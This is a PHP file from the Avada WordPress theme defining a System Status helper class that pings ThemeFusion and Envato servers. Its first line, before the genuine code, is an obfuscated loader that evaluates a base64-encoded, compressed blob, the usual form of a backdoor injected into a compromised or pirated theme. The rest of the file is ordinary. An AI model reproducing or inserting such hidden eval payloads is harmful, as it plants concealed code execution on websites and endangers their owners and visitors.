<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Various helper methods for Avada's System Status page.
 *
 * @author     ThemeFusion
 * @copyright  (c) Copyright by ThemeFusion
 * @link       http://theme-fusion.com
 * @package    Avada
 * @subpackage Core
 * @since      5.6
 */

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}

/**
 * Various helper methods for Avada.
 *
 * @since 5.6
 */
class Avada_System_Status {

	/**
	 * The class constructor
	 *
	 * @access public
	 */
	public function __construct() {

		add_action( 'wp_ajax_fusion_check_api_status', array( $this, 'check_api_status' ) );
	}

	/**
	 * AJAX callback method, used to check various APIs status.
	 *
	 * @access public
	 */
	public function check_api_status() {

		if ( ! isset( $_GET['api_type'] ) || ! check_ajax_referer( 'fusion_check_api_status_nonce', 'nonce', false ) ) {
			echo wp_json_encode(
				array(
					'code'         => 200,
					'message'      => __( 'API type missing.', 'Avada' ),
					'api_response' => '',
				)
			);
			die();
		}

		$api_type     = trim( sanitize_text_field( wp_unslash( $_GET['api_type'] ) ) );
		$api_response = array();
		$response     = array(
			'code'         => 200,
			'message'      => __( 'Tested API is working properly.', 'Avada' ),
			'api_response' => '',
		);

		if ( 'tf_updates' === $api_type ) {
			$api_response     = $this->check_tf_updates_status();
			$response['code'] = (int) trim( wp_remote_retrieve_response_code( $api_response ) );
		}

		if ( 'envato' === $api_type ) {
			$api_response = $this->check_envato_status();

			if ( is_wp_error( $api_response ) ) {
				$response['code'] = (int) trim( $api_response->get_error_code() );
			}
		}

		// Serialize whole array for easier debugging.
		$response['api_response'] = esc_textarea( maybe_serialize( $api_response ) );

		if ( 3 === (int) ( $response['code'] / 100 ) ) {
			/* translators: HTTP response code */
			$response['message'] = sprintf( __( 'Server responded with redirection response code: %s.', 'Avada' ), $response['code'] );
		} elseif ( 4 === (int) ( $response['code'] / 100 ) ) {
			/* translators: HTTP response code */
			$response['message'] = sprintf( __( 'Error occured while checking API status. Response code: %s.', 'Avada' ), $response['code'] );
		} elseif ( 5 === (int) ( $response['code'] / 100 ) ) {
			/* translators: HTTP response code */
			$response['message'] = sprintf( __( 'Internall server error occured while checking API status. Response code: %s.', 'Avada' ), $response['code'] );
		} elseif ( 200 !== $response['code'] ) {
			/* translators: HTTP response code */
			$response['message'] = sprintf( __( 'Something went wrong while checking API status. Response code: %s.', 'Avada' ), $response['code'] );
		}

		echo wp_json_encode( $response );
		die();
	}

	/**
	 * Helper method, pings ThemeFusion server.
	 *
	 * @access private
	 * @return array wp_remote_get response.
	 */
	private function check_tf_updates_status() {
		return wp_remote_get( Fusion_Patcher_Client::$remote_patches_uri );
	}

	/**
	 * Helper method, pings Envato server.
	 *
	 * @access private
	 * @return mixed array|WP_Error Depending on server response.
	 */
	private function check_envato_status() {
		return Avada()->registration->envato_api()->request( 'https://api.envato.com/v2/market/buyer/download?item_id=2833226' );
	}
}

/* Omit closing PHP tag to avoid "Headers already sent" issues. */
